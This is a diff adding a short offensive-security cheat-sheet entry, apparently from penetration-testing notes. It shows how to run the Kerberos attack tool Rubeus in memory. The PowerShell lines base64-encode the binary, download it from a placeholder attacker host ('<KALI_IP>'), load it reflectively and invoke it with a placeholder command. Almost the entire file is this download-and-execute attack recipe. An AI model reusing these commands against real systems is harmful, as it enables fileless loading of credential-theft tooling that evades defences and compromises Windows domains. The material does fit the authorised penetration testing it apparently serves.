@@ -1,0 +1,7 @@
+% rubeus
+
+# running in memory
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("/opt/win/Rubeus.exe")) | Out-File -Encoding ASCII /opt/win/rubeus.txt
+$content = (New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>/win/rubeus.txt')
+$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
+[Rubeus.Program]::Main("<RUBEUS_CMD>".Split())
